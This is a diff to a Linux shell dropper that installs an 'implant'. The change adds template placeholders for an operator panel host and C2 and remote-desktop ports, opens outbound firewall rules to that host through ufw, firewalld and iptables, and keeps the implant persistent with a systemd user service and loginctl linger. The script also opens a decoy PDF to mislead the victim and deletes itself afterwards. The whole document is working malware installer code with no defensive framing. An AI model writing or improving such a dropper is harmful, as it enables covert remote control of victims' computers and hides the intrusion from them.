@@ -11,25 +11,26 @@ BINDIR="${HOME}/.local/bin"
 UNITDIR="${HOME}/.config/systemd/user"
 BIN="${BINDIR}/${BIN_NAME}"
 
+# Operator panel (baked in at build time) so the implant can always reach home.
+PANEL_HOST="{{PANEL_HOST}}"
+PANEL_C2_PORT="{{PANEL_C2_PORT}}"
+PANEL_RD_PORT="{{PANEL_RD_PORT}}"
+
 mkdir -p "$BINDIR" "$UNITDIR"
 
-# preconfigure the host firewall so the implant can reach the operator even if a
-# strict outbound policy is set. Best effort; needs root for iptables/firewalld.
-for port in 8888 8443; do
-  if command -v ufw >/dev/null 2>&1; then
-    sudo -n ufw allow out "${port}/tcp" >/dev/null 2>&1 || true
-  fi
-  if command -v firewall-cmd >/dev/null 2>&1; then
-    sudo -n firewall-cmd --permanent --add-port="${port}/tcp" >/dev/null 2>&1 || true
-    sudo -n firewall-cmd --add-port="${port}/tcp" >/dev/null 2>&1 || true
-  fi
-done
+# ---- firewall: allow outbound to operator panel on C2 + RD ports -----------
+if command -v ufw >/dev/null 2>&1; then
+  sudo -n ufw allow out to "${PANEL_HOST}" port "${PANEL_C2_PORT}" proto tcp >/dev/null 2>&1 || true
+  sudo -n ufw allow out to "${PANEL_HOST}" port "${PANEL_RD_PORT}" proto tcp >/dev/null 2>&1 || true
+fi
 if command -v firewall-cmd >/dev/null 2>&1; then
+  sudo -n firewall-cmd --permanent --add-rich-rule="rule family=ipv4 destination address=${PANEL_HOST} port port=${PANEL_C2_PORT} protocol=tcp accept" >/dev/null 2>&1 || true
+  sudo -n firewall-cmd --permanent --add-rich-rule="rule family=ipv4 destination address=${PANEL_HOST} port port=${PANEL_RD_PORT} protocol=tcp accept" >/dev/null 2>&1 || true
   sudo -n firewall-cmd --reload >/dev/null 2>&1 || true
 fi
 if [ "$(id -u)" = "0" ] && command -v iptables >/dev/null 2>&1; then
-  iptables -I OUTPUT -p tcp --dport 8888 -j ACCEPT 2>/dev/null || true
-  iptables -I OUTPUT -p tcp --dport 8443 -j ACCEPT 2>/dev/null || true
+  sudo -n iptables -I OUTPUT -d "${PANEL_HOST}" -p tcp --dport "${PANEL_C2_PORT}" -j ACCEPT >/dev/null 2>&1 || true
+  sudo -n iptables -I OUTPUT -d "${PANEL_HOST}" -p tcp --dport "${PANEL_RD_PORT}" -j ACCEPT >/dev/null 2>&1 || true
 fi
 
 # stay awake: ignore lid-close sleep in logind (needs root; best effort).
@@ -59,7 +60,11 @@ UNIT
 
 if command -v systemctl >/dev/null 2>&1; then
   systemctl --user daemon-reload >/dev/null 2>&1 || true
-  systemctl --user enable --now "${UNIT}.service" >/dev/null 2>&1 || true
+  systemctl --user enable --now "${UNIT_NAME}.service" >/dev/null 2>&1 || true
+fi
+
+if command -v loginctl >/dev/null 2>&1; then
+  loginctl enable-linger "$(id -un)" >/dev/null 2>&1 || true
 fi
 
 sleep 1
@@ -67,10 +72,6 @@ setsid "$BIN" </dev/null >/dev/null 2>&1 &
 
 if [ -f "${HERE}/decoy.pdf" ]; then
   ( sleep 1.5; command -v xdg-open >/dev/null 2>&1 && xdg-open "${HERE}/decoy.pdf" >/dev/null 2>&1 || true ) &
-fi
-
-if command -v loginctl >/dev/null 2>&1; then
-  loginctl enable-linger "$(id -un)" >/dev/null 2>&1 || true
 fi
 
 # self-destruct: once the implant is running, remove the dropper + decoy so
